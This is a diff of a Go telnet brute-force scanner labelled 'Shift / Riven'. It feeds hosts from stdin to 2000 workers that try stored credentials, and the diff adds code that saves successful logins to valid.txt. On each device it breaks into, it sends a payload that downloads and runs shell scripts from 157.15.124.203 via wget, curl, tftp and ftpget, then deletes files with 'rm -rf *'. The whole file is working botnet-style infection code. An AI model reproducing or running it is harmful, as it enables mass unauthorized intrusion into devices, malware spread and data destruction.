@@ -62,12 +62,12 @@ var CREDENTIALS = []struct {
 }
 
 const (
-	TELNET_TIMEOUT    = 2 * time.Second
-	MAX_WORKERS       = 2000
-	PAYLOAD           = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.15.124.203/ohshit.sh; curl -O http://157.15.124.203/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 157.15.124.203 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 157.15.124.203; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 157.15.124.203 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *"
-	STATS_INTERVAL    = 1 * time.Second
-	MAX_QUEUE_SIZE    = 100000
-	CONNECT_TIMEOUT   = 1 * time.Second
+	TELNET_TIMEOUT  = 2 * time.Second
+	MAX_WORKERS     = 2000
+	PAYLOAD         = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.15.124.203/ohshit.sh; curl -O http://157.15.124.203/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 157.15.124.203 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 157.15.124.203; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 157.15.124.203 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *"
+	STATS_INTERVAL  = 1 * time.Second
+	MAX_QUEUE_SIZE  = 100000
+	CONNECT_TIMEOUT = 1 * time.Second
 )
 
 type CredentialResult struct {
@@ -91,7 +91,7 @@ type TelnetScanner struct {
 
 func NewTelnetScanner() *TelnetScanner {
 	runtime.GOMAXPROCS(runtime.NumCPU())
-	
+
 	return &TelnetScanner{
 		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
 		done:             make(chan bool),
@@ -126,13 +126,13 @@ func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interfa
 	data := make([]byte, 0, 1024)
 	buf := make([]byte, 1024)
 	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
-	
+
 	startTime := time.Now()
 	for !promptCheck(data, loginPrompts...) {
 		if time.Since(startTime) > TELNET_TIMEOUT {
 			return false, "login prompt timeout"
 		}
-		
+
 		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
 		n, err := conn.Read(buf)
 		if err != nil || n == 0 {
@@ -149,13 +149,13 @@ func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interfa
 
 	data = data[:0]
 	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
-	
+
 	startTime = time.Now()
 	for !promptCheck(data, passwordPrompts...) {
 		if time.Since(startTime) > TELNET_TIMEOUT {
 			return false, "password prompt timeout"
 		}
-		
+
 		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
 		n, err := conn.Read(buf)
 		if err != nil || n == 0 {
@@ -171,7 +171,7 @@ func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interfa
 
 	data = data[:0]
 	shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}
-	
+
 	startTime = time.Now()
 	for time.Since(startTime) < TELNET_TIMEOUT {
 		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
@@ -181,7 +181,7 @@ func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interfa
 			continue
 		}
 		data = append(data, buf[:n]...)
-		
+
 		if promptCheck(data, shellPrompts...) {
 			conn.SetWriteDeadline(time.Now().Add(TELNET_TIMEOUT))
 			_, err = conn.Write([]byte(PAYLOAD + "\n"))
@@ -220,7 +220,7 @@ func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
 			break
 		}
 	}
-	
+
 	if len(data) > 0 {
 		return string(data)
 	}
@@ -232,25 +232,34 @@ func (s *TelnetScanner) worker() {
 
 	for host := range s.hostQueue {
 		atomic.AddInt64(&s.queueSize, -1)
-		
+
 		found := false
 		if host == "" {
 			continue
 		}
-		
+
 		for _, cred := range CREDENTIALS {
 			success, result := s.tryLogin(host, cred.Username, cred.Password)
 			if success {
 				atomic.AddInt64(&s.valid, 1)
-				
+
 				credResult := result.(CredentialResult)
 				s.lock.Lock()
 				s.foundCredentials = append(s.foundCredentials, credResult)
 				s.lock.Unlock()
-				
+
 				fmt.Printf("\n[+] Found: %s | %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
 				fmt.Printf("[*] Output: %s\n\n", credResult.Output)
-				
+
+				// Simpan ke valid.txt
+				f, err := os.OpenFile("valid.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+				if err == nil {
+					_, _ = f.WriteString(fmt.Sprintf("%s:23 %s:%s\n", credResult.Host, credResult.Username, credResult.Password))
+					f.Close()
+				} else {
+					fmt.Printf("[!] Gagal menulis ke valid.txt: %v\n", err)
+				}
+
 				found = true
 				break
 			}
@@ -276,11 +285,11 @@ func (s *TelnetScanner) statsThread() {
 			valid := atomic.LoadInt64(&s.valid)
 			invalid := atomic.LoadInt64(&s.invalid)
 			queueSize := atomic.LoadInt64(&s.queueSize)
-			
+
 			memStats := runtime.MemStats{}
 			runtime.ReadMemStats(&memStats)
-			
-			fmt.Printf("\rtotal: %d | valid: %d | invalid: %d | queue: %d | routines: %d\n", 
+
+			fmt.Printf("\rtotal: %d | valid: %d | invalid: %d | queue: %d | routines: %d\n",
 				scanned, valid, invalid, queueSize, runtime.NumGoroutine())
 		}
 	}
@@ -288,26 +297,26 @@ func (s *TelnetScanner) statsThread() {
 
 func (s *TelnetScanner) Run() {
 	fmt.Printf("Initializing scanner (%d / %d)...\n\n\n", MAX_WORKERS, MAX_QUEUE_SIZE)
-	
+
 	go s.statsThread()
 
 	stdinDone := make(chan bool)
-	
+
 	go func() {
 		reader := bufio.NewReader(os.Stdin)
 		hostCount := 0
-		
+
 		for {
 			line, err := reader.ReadString('\n')
 			if err != nil {
 				break
 			}
-			
+
 			host := line[:len(line)-1]
 			if host != "" {
 				atomic.AddInt64(&s.queueSize, 1)
 				hostCount++
-				
+
 				select {
 				case s.hostQueue <- host:
 				default:
@@ -316,40 +325,37 @@ func (s *TelnetScanner) Run() {
 				}
 			}
 		}
-		
+
 		fmt.Printf("Finished reading input: %d hosts queued\n", hostCount)
 		stdinDone <- true
 	}()
 
 	maxWorkers := MAX_WORKERS
-	activeWorkers := 0
-	
 	for i := 0; i < maxWorkers; i++ {
 		s.wg.Add(1)
-		activeWorkers++
 		go s.worker()
 	}
 
 	<-stdinDone
-	
+
 	close(s.hostQueue)
-	
+
 	s.wg.Wait()
 	s.done <- true
 
 	scanned := atomic.LoadInt64(&s.scanned)
 	valid := atomic.LoadInt64(&s.valid)
 	invalid := atomic.LoadInt64(&s.invalid)
-	
+
 	fmt.Println("\n\nScan complete!")
 	fmt.Printf("Total scanned: %d\n", scanned)
 	fmt.Printf("Valid logins found: %d\n", valid)
 	fmt.Printf("Invalid attempts: %d\n", invalid)
-	
+
 	if len(s.foundCredentials) > 0 {
 		fmt.Println("\nFound credentials:")
 		for _, cred := range s.foundCredentials {
-			fmt.Printf("%s - %s:%s\n", cred.Host, cred.Username, cred.Password)
+			fmt.Printf("%s:23 %s:%s\n", cred.Host, cred.Username, cred.Password)
 		}
 	}
 }
@@ -357,7 +363,7 @@ func (s *TelnetScanner) Run() {
 func main() {
 	fmt.Println("\n\n\nShift / Riven Telnet scanner")
 	fmt.Printf("Total CPU cores: %d\n", runtime.NumCPU())
-	
+
 	scanner := NewTelnetScanner()
 	scanner.Run()
 }
